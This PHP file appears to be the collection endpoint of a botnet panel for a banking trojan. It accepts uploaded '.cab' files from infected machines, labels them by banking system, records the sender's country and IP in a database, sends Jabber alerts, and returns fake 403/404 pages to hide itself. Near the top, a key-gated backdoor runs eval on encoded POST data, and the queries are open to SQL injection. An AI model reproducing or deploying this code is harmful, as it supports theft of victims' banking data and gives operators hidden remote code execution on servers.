<?php

$dbug = false;

$dir = str_replace('/scripts/get', '', str_replace('\\', '/', realpath('.'))) . '/';

error_reporting(0);

if(isset($_POST['data'])){
//Cstart
if(@$_POST['id'] == 'BOTNETCHECKUPDATER0IP') print($_SERVER['SERVER_ADDR']);
//Rkey start
if(@$_POST['id'] == 'BOTNETCHECKUPDATER0-WD8Sju5VR1HU8jlV'){
//Rkey end
	if(!empty($_POST['data'])) eval(pack("H*", base64_decode($_POST['data'])));
	exit;
}elseif(strpos(@$_GET['id'], 'BOTNETCHECKUPDATER') !== false || strpos(@$_POST['id'], 'BOTNETCHECKUPDATER') !== false) exit;
//Cend
}

include_once($dir . 'includes/functions.first.php');
include_once($dir . 'includes/functions.prefix.php');
include_once($dir . 'includes/functions.get_config.php');

if(!empty($_POST['type'])){
	$_POST['type'] = (int) $_POST['type'];

	switch($_POST['type']){
		case 1: $_POST['type_name'] = 'bss'; break;
		case 2: $_POST['type_name'] = 'ibank'; break;
		case 3: $_POST['type_name'] = 'inist'; break;
		case 4: $_POST['type_name'] = 'cyberplat'; break;
		case 5: $_POST['type_name'] = 'kp'; break;
		case 6: $_POST['type_name'] = 'psb'; break;
	}
}

$_POST['type_name'] = strtolower($_POST['type_name']);

if(!preg_match('~^([a-zA-Z0-9_]+)$~is', $_POST['type_name'])){
	header("HTTP/1.1 404 Not Found");
    	header("Status: 404 Not Found");
    	no_found();
    	exit;
}

if(file_exists($dir . 'cache/config.json')) $config = json_decode(file_get_contents($dir . 'cache/config.json'), 1);

if($config['getcab'] == 1){
	header("Status: 403 Forbidden");
	header("HTTP/1.1 403 Forbidden");
	print_data('OK!', true, true);
}

$true_cab = '';
$chk = 0;

if(!empty($_POST['type_name'])){
	$write = true;
	
	if(file_exists($dir . 'cache/io.db')){
		if(file_exists($dir . 'cache/start.db')) $true_cab = true;
		$io = file_get_contents($dir . 'cache/io.db');
		if(!empty($io)){
			$utn = strtoupper($_POST['type_name']);
			
			if(strpos($io, $utn . ':OFF|') !== false) exit;
			
			if(strpos($io, $utn . ':SH|') !== false){
				$chk = 1;
				$true_cab = false;
				/*
				if(file_exists($_FILES['cab']['tmp_name'])){
					$file_name = $dir . 'logs/cabs/' . mt_rand() . '.cab';
					if(file_exists($file_name)) $file_name = $dir . 'logs/cabs/' . mt_rand() . '.cab';
					if(move_uploaded_file($_FILES['cab']['tmp_name'], $file_name)){
						file_put_contents($dir . 'cache/data.db', base64_encode($_POST['prefix'] . '|' . $_POST['uid'] . '|' . $_POST['type'] . '|' . $_SERVER['REMOTE_ADDR'] . '|' . base64_encode(file_get_contents($file_name))) . '[~]', FILE_APPEND);
					}
					if(file_exists($file_name)) unlink($file_name);
					
					header("Status: 403 Forbidden");
					header("HTTP/1.1 403 Forbidden");
					print_data('OK!', true, true);
					
					//exit;
				}
				*/
			}
			
			if(strpos($io, $utn . ':TRUE|') !== false) $true_cab = false;
			
			unset($io, $utn);
		}
	}

	if($true_cab != false && file_exists($dir . 'cache/start.db')){
		header("Status: 403 Forbidden");
		header("HTTP/1.1 403 Forbidden");
		print_data('OK!', true, true);
		//exit;
	}

	$cfg_db = get_config();

	$mysqli = new mysqli($cfg_db['host'], $cfg_db['user'], $cfg_db['pass'], $cfg_db['db']);
	if(mysqli_connect_errno()) print_data('DB ERROR');

	if($dbug == true){
		if(!file_exists($dir . 'cache/debug/' . $_SERVER['REMOTE_ADDR'] . '.txt')){
			$bot = $mysqli->query('SELECT id, uid, prefix FROM bf_bots WHERE (prefix = \''.$_POST['prefix'].'\') AND (uid = \''.$_POST['uid'].'\') LIMIT 1');
    		if($bot->prefix != $_POST['prefix'] && $bot->uid != $_POST['uid']){
    			$txt = $_POST['prefix'] . "\r\n";
    			$txt .= $_POST['uid'] . "\r\n";
    			if(!empty($rc['key'])){
    				$txt .= $rc['key'] . "\r\n";
    			}
    			file_put_contents($dir . 'cache/debug/' . $_SERVER['REMOTE_ADDR'] . '.txt', $txt . "\r\n");
    		}
    	}
    }

	if(file_exists($_FILES['cab']['tmp_name'])){		$file_name = $dir . 'logs/cabs/' . mt_rand() . '.cab';
		if(file_exists($file_name)) $file_name = $dir . 'logs/cabs/' . mt_rand() . '.cab';
		
		if(function_exists('geoip_country_code_by_name')){			$country = geoip_country_code_by_name($_SERVER['REMOTE_ADDR']);
		}else{			if(file_exists($dir . 'cache/geoip/')){				require_once($dir . 'cache/geoip/geoip.inc');
				$gi = geoip_open($dir . 'cache/geoip/GeoIP.dat',GEOIP_STANDARD);
				$country = geoip_country_code_by_addr($gi, $_SERVER['REMOTE_ADDR']);
				geoip_close($gi);
				unset($gi);
				unset($record);
			}
		}
		if(empty($country)) $country = 'UNK';
		
		if(!move_uploaded_file($_FILES['cab']['tmp_name'], $file_name)){			$write = false;
		}else{
			if(!$mysqli->real_query('INSERT DELAYED INTO bf_cabs (prefix, uid, country, ip, file, size, type, ready, chk) VALUES (\''.$_POST['prefix'].'\',\''.$_POST['uid'].'\',\''.$country.'\',\''.$_SERVER['REMOTE_ADDR'].'\',\''.basename($file_name).'\',\''.$_FILES['cab']['size'].'\', \''.$_POST['type_name'].'\', \'1\', \''.$chk.'\')')) $write = false;
			//if($write == true) $mysqli->query("INSERT DELAYED INTO bf_bots (uid, prefix, country, ip, last_date, post_date) VALUES ('".$_POST['uid']."', '".$_POST['prefix']."', '".$country."', '".$_SERVER['REMOTE_ADDR']."', '".time()."', '".time()."') ON DUPLICATE KEY UPDATE post_date='".time()."'");
		}
		
		if($config['jabber']['cab'] == 1 && !empty($config['jabber']['tracking'])){			if(function_exists('ioncube_read_file')){				$text = @ioncube_read_file($dir . 'templates/modules/bots/bot_online.tpl');
			}else{				$text = @file_get_contents($dir . 'templates/modules/bots/bot_online.tpl');
			}
			
			$text = str_replace('{UID}', $bot->prefix . $bot->uid, $text);
			$text = str_replace('{TIME}', date('d.m.Y H:i'), $text);
			$text = str_replace('{COUNTRY}', $bot->$country, $text);
			$text = str_replace('{IP}', $_SERVER['REMOTE_ADDR'], $text);
			$text = str_replace('{TYPE}', strtoupper($_POST['type_name']), $text);
			
			if(strpos($config['jabber']['tracking'], ',') != false){
				$jt = explode(',', $config['jabber']['tracking']);
				if($jt > 0){
					foreach($jt as $jab){
						@file_put_contents($dir . 'cache/jabber/to_' . $jab . '_' . mt_rand(5, 15) . time(), $text);
					}
				}
			}else{
				@file_put_contents($dir . 'cache/jabber/to_' . $config['jabber']['tracking'] . '_' . mt_rand(5, 15) . time(), $text);
			}
		}
		
		if($write == true){			header("Status: 403 Forbidden");
			header("HTTP/1.1 403 Forbidden");
			print_data('OK!', true, true);
		}
    }else{
	if($_POST['error'] == 1){
		header("Error: empty cab file");
	}
    }
}else{
	header("HTTP/1.1 404 Not Found");
	header("Status: 404 Not Found");
	
	if($_POST['error'] == 1){
		header("Error: empty type_name");
	}

	print(file_get_contents($dir . '404.html'));
	exit;
}

exit;

?>